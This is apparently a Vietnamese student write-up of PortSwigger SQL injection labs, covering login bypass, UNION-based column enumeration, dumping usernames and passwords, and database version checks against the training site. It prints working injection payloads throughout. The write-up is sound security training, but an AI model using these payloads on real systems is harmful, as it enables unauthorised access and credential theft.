# Portswigger SQL Injection
Hello mấy ní hôm nay cùng tìm hiểu SQL injection trên Portswigger nhé =)))). 
## SQL là gì?
Sql injection là một lỗ hổng bảo mật web ( web security vulnerability ) cho phép các hacker can thiệp vào các truy vấn mà application tạo ra để gửi đến các database của nó.
![image](https://github.com/user-attachments/assets/73811511-6f78-42c0-847d-3549dceaf451)   
### **Question: Vây các hacker có thể khai thác được gì từ SQLI?**
* Các hacker có thể xem những thông tin mà thông thường chúng ta không thể thấy được.
* Kẻ tấn công còn có thể thông qua đó mà chỉnh sửa và xóa đi các thông tin quan trọng trong database. 
* Kẻ tấn công có thể thông qua SQLI để leo thang các của tấn công của họ đến các máy chủ hay cơ sở hạng tầng khác.   
## Hậu quả các cuộc tấn công bằng SQL injection ?
Hậu quả của việc bị xâm phạm vào các thông tin nhạy cảm có thể là hậu quả của 1 cuộc tấn công bằng SQL Injection, trong đó các thông tin thường bị lộ là:
* Thông tin về tài chính như thẻ ngân hàng, thẻ ghi nợ.
* Thông tin cá nhân.
* Thông tin về tài khoản mật khẩu quan trọng như ví điện tử, mxh,... 


## LAB1: [Retrieving hidden data](https://https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-retrieving-hidden-data/sql-injection/lab-retrieve-hidden-data). 

![image](https://github.com/user-attachments/assets/737429d1-bdf7-4988-bad3-8e5467b9169d)

Dựa theo yêu cầu đề bài chúng ta phải làm xuất hiện các sản phẩm chưa được công bố trong trang web. 
Câu lệnh truy vấn SQL là:
``` 
SELECT * FROM products WHERE category = 'Gifts' AND released =1 
```
Giải nghĩa: trả về thông tin sản phẩm khi 'category' là gifts và ```released = 1 ``` → nó chỉ hiện ra các sản phẩm thuộc gifts và đã được công bố.
Để khai thác ta có thể thêm vào URL của trang web từ 
```
https://0afe00b6047c270583e3fe7c00050033.web-security-academy.net/filter?category=Accessories
```
![image](https://github.com/user-attachments/assets/24fad3eb-8d20-40d6-9517-c1b2461effa3)  
bằng cách thêm vào '+OR+1=1--
```
https://0afe00b6047c270583e3fe7c00050033.web-security-academy.net/filter?category=Accessories'+OR+1=1--
```
![image](https://github.com/user-attachments/assets/784d1e02-b6a1-450b-ba39-da563dcdc297)  
Như ta thấy nó đã hiện ra các sản phẩm bị giấu đi. 
Giả sử như truy vấn ban đầu là: 
```linux
SELECT * FROM products WHERE category = 'Accessories';
```
sau khi chèn pay load vào thì nó trở thành:
```linux
SELECT * FROM products WHERE category = 'Accessories' OR 1=1--';
```
* OR 1=1: Luôn đúng → Kết quả trả về tất cả sản phẩm thay vì chỉ "Accessories".  
* --: Đây là dấu comment trong SQL, giúp bỏ qua phần còn lại của truy vấn, tránh lỗi cú pháp.  



## LAB2: Subverting application logic 
![image](https://github.com/user-attachments/assets/7700dc91-c5a7-495f-a405-eef8b753d3ac) 
Theo yêu cầu là phải đăng nhập với dữ liệu biết trước là có một tài khoản tồn tại trong database tên là "administrator". 
![image](https://github.com/user-attachments/assets/ca3cbbec-ba7c-4ebd-9174-49f15ada16cd)  
Đây là giao diện ban đầu của trang web, chúng ta cùng nhau đến trang đăng nhập nào.
![image](https://github.com/user-attachments/assets/6f634558-a75f-4c5d-9545-acdf230e5058)  
Vì đã biết là có một user tên 'adminstrator' nên ta sẽ bypass bằng cách nhập vào phần user "adminstrator'--"  
![image](https://github.com/user-attachments/assets/a08fa73b-1619-4336-bbe7-303f35138fb1)  
Chúng ta đã đăng nhập được vào tài khoản admin.    
Như ta biết lệnh truy vấn ban đầu khi ta đăng nhập sẽ là:
```sql=
SELECT * FROM users WHERE username = 'username' AND password = 'password';
```  
nên nếu ta chèn thêm ```adminstrator'--``` vào truy vấn sẽ trở thành:
```sql=
SELECT * FROM users WHERE username = 'administrator'--' AND password = '';
```
chương trình sẽ hiểu là bỏ qua mật khẩu và sẽ đăng nhập thành công với tên người dùng hợp lệ.   



## SQL injection UNION attacks
```**Union**: là một lệnh trong sql cho phép kết hợp giá trị trả về của 2 hay nhiều truy vấn *SELECT* , sau đó trả về các bản ghi không bị trùng lập ( nếu trùng thì chỉ giữ lại 1 bản ghi).```
**Lưu ý:**
 * Số hàng, cột từ hai bảng được truy xuất phải giống nhau. 
 * Kiểu dữ liệu của từng cột phải hợp lệ với các truy vấn riêng lẻ. 
Do đó để bypass bằng UNION chúng ta cần lưu ý hai vấn đề:
* **```Số cột của 1 bảng.```**
* **```Kiểu dữ liệu ứng với truy vấn SELECT.```**
### Determining the number of columns required
Có **hai cách** hiệu quả để xác định số cột của 1 bảng:
Cách 1: ORDER BY: Chúng ta sử dụng lệnh ORDER BY và tăng dần số cột lên cho đến khi xảy ra lỗi. Chúng ta chèn vào:
```sql=
` ORDER BY 1--
` ORDER BY 2--
` ORDER BY 3--
etc.
```
Sau quá trình đó data base có thể trả về lỗi kiểu như: 
```sql=
The ORDER BY position number 3 is out of range of the number of items in the select list.
```
Cách 2: UNION SELECT: Chúng ta dùng lệnh UNION SELECT để xác định số cột bằng cách chèn vào:
```sql=
` UNION SELECT NULL--
` UNION SELECT NULL,NULL--
` UNION SELECT NULL,NULL,NULL--
etc.
``` 
lặp lại cho đến khi không có thông báo lỗi, dùng NULL vì trong SQL dữ liệu NULL có thể chuyển thành bất kì kiểu dữ liệu nào khác.
Ví dụ lệnh truy vấn ban đầu là: 
```sql=
SELECT id, username, password FROM users WHERE username='xxx';
```
thì sau khi chèn ``` `UNION SELECT NULL,NULL,NULL--``` nó trở thành"
```sql=
SELECT id, username, password FROM users WHERE username="xxx";
```
thì câu truy vấn trở thành:
```sql=
SELECT id, username, password FROM users WHERE username="xxx"  
UNION SELECT NULL, NULL, NULL;
```
từ đó ta biết số cột trong truy vấn SELECT là 3.
## LAB3 : Lab: SQL injection UNION attack, determining the number of columns returned by the query.
![image](https://github.com/user-attachments/assets/8ea443f5-907e-4ffd-b43c-5c11da5f0af2)
Để giải lab này cần tìm đươc số cột của truy vấn. 
Trong bài này hãy sử dụng Burpsuite để modify các request gửi tới nhé.
### Sử dụng ORDER BY
Theo ý tưởng ban đầu về sử dụng ORDER BY là liên tục lặp lại và tăng dấn số cột truy vấn cho đến khi xảy ra lỗi. 
![image](https://github.com/user-attachments/assets/794be6c3-044b-4468-b17f-0769e6749645)
Đây là URL ban đầu:
```
https://0a5600a604328ef7814f935100e0009c.web-security-academy.net/filter?category=Gifts
```
Như đã thấy mình đang chọn filter cho category là gifts, sau đó mình sẽ chèn thử ```' ORDER BY 1--``` trước để thử.
```
https://0a5600a604328ef7814f935100e0009c.web-security-academy.net/filter?category=Gifts' ORDER BY 1--
```
![image](https://github.com/user-attachments/assets/7307e5a0-5b9c-4dec-ac9b-cd7edfbf07a3) 
Sau khi gửi Request thì không có gì xảy ra cho nên mình tiếp tục tăng số Column lên cho đến khi bằng 4 thì xảy ra lỗi 
![image](https://github.com/user-attachments/assets/7fb353a5-e1eb-46a2-b484-ebe5ab9353ad)
![image](https://github.com/user-attachments/assets/eb8676de-0e8f-4bc6-a8e3-d2a473ce51e5)  
Web xảy ra lỗi khi truy vấn số cột là 4 nên số cột cần tìm lã 3.  
### Sử dụng NULL.
Vì đã biết là số cột cần tìm là 3 nên mình mặc định chèn vào 3 giá trị NULL nhé:
```
GET /filter?category=Lifestyle' UNION SELECT NULL, NULL, NULL--
```
![image](https://github.com/user-attachments/assets/ba912490-e8ad-4b4c-b524-02ae0611927e)  
Sau khi gửi Request đi thì web đã báo mình hoàn thành bài lab.
![image](https://github.com/user-attachments/assets/90e6654a-500e-4429-9875-f3ac7a58c381) 
## Finding columns with a useful data type 
SQL injection UNION attack truy xuất thông tin từ các truy vấn được chèn vào, một điểu thú vị là các thông tin bạn muốn thường tương trích với kiểu string data. 
Nên sau khi xác định được số columns cần thiết, bạn có thể thăm dò xem nó có chứa dữ liệu chuỗi không bằng cách nhập 1 loạt các ```SQL injection UNION attack```:
```sql=
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```
Nếu kiểu dữ liệu của cột không tương thích thì nó sẽ trả về:
```sql=
Conversion failed when converting the varchar value 'a' to data type int.
```
## LAB4 : SQL injection UNION attack, finding a column containing text
![image](https://github.com/user-attachments/assets/a28daddb-dffd-4a68-a07d-3bc209045459)
### Xác định số Column (Determine number of columns).
Đầu tiên mình sẽ dùng Burpsuite để intercept vào trang web trước để xác định số cột nhé, bước này mình sẽ dùng ORDER BY. 
Sau khi thực hiện các thao tác như lab trước đó thì mình biết số column cần tìm là 3.
![image](https://github.com/user-attachments/assets/7339f1e9-5d01-462c-889a-4d35958b59e0)  

### Xác đỉnh column nào chứa kiểu dữ liệu string
Mình sẽ thực hiện bằng cách chèn lần lượt vào nhé, Sau khi thử nhiều lần thì mình xác định chứa kiểu string sẽ ở cột thứ 2 nên mình sẽ chèn như này:
```sql=
' UNION SELECT NULL, 'abcdef', NULL--
```
![image](https://github.com/user-attachments/assets/35ea38e1-69d4-43c3-889b-8e5f4bc34308) 
và thế là mình hoàn thành lab này. =))))


## LAB5 : Using a SQL injection UNION attack to retrieve interesting data   

![image](https://github.com/user-attachments/assets/416493c4-3588-4105-be84-48bb57ab78c4)

Lab này mình vẫn làm các bước như lab trước là tìm số cột ( sau khi tìm là 2 ), và tìm số cột có kiểu string trong đó ( trường hợp này cũng là cả 2 cột ).
Tiếp đến vì để đã cho biết tên của 2 columns và table rồi nên mình sẽ dựa vào đó để chèn query vào
```sql=
' UNION SELECT username, password FROM users --
```
![image](https://github.com/user-attachments/assets/8a0c7459-a1e0-4465-b509-2e9fd2cf15fc)

qua đó mình sẽ thu được thông tin của adminstrator là:
* **username= administrator**
* **password= im4gh819ktv1fsmfx11z**
![image](https://github.com/user-attachments/assets/5027451e-0792-4758-bf70-e925989c71d4)
Mình đã thành công đăng nhập vào account của admin. 

## LAB6: SQL injection UNION attack, retrieving multiple values in a single column 
![image](https://github.com/user-attachments/assets/fbb68f1b-cb87-4c52-9924-d6380617c58c) 
Nhìn có vẻ giống như Lab trước đó nên ý tưởng sẽ là tìm số cột cần sử dụng , tìm cột chứa dữ liệu string và sau đó truy xuất thông tin của tài khoản adminstator.

### Kiểm tra số column
Vì phần trước mình đã dùng ORDER BY r nên phần này mình thử dùng NULL nhé:

Sau khi kiểm tra thì mình nhận thấy chỉ có 2 columns được SELECT.
![image](https://github.com/user-attachments/assets/c0232966-38fb-4324-8713-6db0d6aee597) 

### Kiểm tra column chứa kiểu string
![image](https://github.com/user-attachments/assets/9400387f-f2e9-43fa-bb97-7fe6d719a1a7) 
Tiếp tục thế thử các cụm 'ABCEDF' thì chỉ có column thứ 2 nhận kiểu string

### Truy xuất thông tin users
Vì thông tin chúng ta cần username và password nhưng chúng ta chỉ có 1 cột được phép chứa thông tin kiểu string nên mình sẽ dùng ghép chuỗi ( Trong oracle như lab thì nó là   | | ).
Truy vấn mình chèn vào là:
```sql=
'+UNION+SELECT+NULL,username||'~'||password+FROM+users-- 
```
![image](https://github.com/user-attachments/assets/86ac84dc-52c3-411a-aa6a-911b0c6ce960) 
Mình đã có thông tin của adminstrator:
* **username: adminstrator.**
* **password: px9mnv901iypdwbkk07x.**

### Kiểm tra thông tin
![image](https://github.com/user-attachments/assets/f33a8112-1eee-4bdf-8c77-408e63466bc4)  
Như vậy là chúng ta đã hoàn thành bài lab.

## Examining the database in SQL injection attacks
Khi thai thác các lỗ hổng bảo mật về SQL, chúng ta cần có thông tin về cơ sở dữ liệu (database) bao gồm:
* **Phiên bản và loại database.**
* **Các tables và columns có trong database.**
Bạn có thể thử bằng các lệnh ứng với các nhà phát triển:


| Database type    | Query                   |
| ---------------- | ----------------------- |
| Microsoft, MySQL | SELECT @@version        |
| Oracle           | SELECT * FROM v$version |
| PostgreSQL       | SELECT version()        |  
## LAB 7: SQL injection attack, querying the database type and version on MySQL and Microsoft
![image](https://github.com/user-attachments/assets/2448b203-381b-46f9-809b-e9350f0ee3b7) 
Yêu cầu đề bài là tìm ra phiên bản của database, nên mình sẽ tìm column nào tương thích với kiểu string rồi sau đó sẽ thử từng lệnh của mỗi database vào nhé.
### Kiểm tra số column và column chứa kiểu string
Sau khi kiểm tra thì mình thấy chỉ cần dùng tới 2 columns và cả hai đều có thể chứa kiểu sring nên sau đó mình thử các lệnh truy xuất phiên bản vào
### Kiểm tra phiên bản
Vì mình đã biết phải dùng comment của MYSQL nên mình sẽ chèn ```' UNION SELECT @@version#``` vào nhé.
![image](https://hackmd.io/_uploads/S1pX8OUnye.png)
Phiên bản trả về là ```8.0.39```.

